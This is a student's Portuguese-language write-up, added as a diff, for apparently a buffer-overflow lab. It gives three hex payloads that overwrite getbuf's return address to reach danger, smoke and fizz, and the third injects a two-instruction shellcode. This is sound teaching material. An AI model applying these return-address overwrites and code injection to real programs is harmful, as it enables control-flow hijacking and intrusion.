@@ -1,0 +1,73 @@
+EXERCÍCIO 1 
+
+Para esse exercício coloquei 40 bytes de padding (32 do buffer
++ 8 do rbp salvo) seguidos do endereço de danger em
+little-endian, sobrescrevendo o endereço de retorno de getbuf.
+ 
+stringinvasora:
+ 
+  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  06 12 40 00 00 00 00 00
+ 
+Output:
+ 
+  buf: 0x7fffffffcdb0
+ 
+  danger! you called danger()
+ 
+  -> cannot be called without validation!
+  Oops!: You executed an illegal instruction
+  Better luck next time
+ 
+ 
+EXERCÍCIO 2 
+ 
+Estendi o payload do exercício anterior adicionando o endereço
+de smoke logo depois do de danger, assim quando danger faz ret
+ele cai em smoke.
+ 
+stringinvasora2:
+ 
+  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  06 12 40 00 00 00 00 00
+  67 12 40 00 00 00 00 00
+ 
+Output:
+ 
+  buf: 0x7fffffffcdb0
+ 
+  danger! you called danger()
+ 
+  -> cannot be called without validation!
+  Smoke!: You called smoke()
+ 
+ 
+EXERCÍCIO 3 
+
+ 
+Criei um codigo.s com duas instruções: coloca 0x01020304 em
+%edi (primeiro argumento em x86-64) e faz ret para cair em
+fizz. Os 6 bytes gerados vão no início do buffer, o endereço
+de buf substitui o ret addr de getbuf, e o endereço de fizz
+vem logo depois para o ret do código injetado usar.
+ 
+codigo.s:
+  movl $0x01020304, %edi
+  ret
+ 
+stringinvasora3:
+ 
+  bf 04 03 02 01 c3 00 00 00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  b0 cd ff ff ff 7f 00 00
+  88 12 40 00 00 00 00 00
+ 
+Output:
+ 
+  buf: 0x7fffffffcdb0
+  Fizz!: You called fizz(0x1020304)
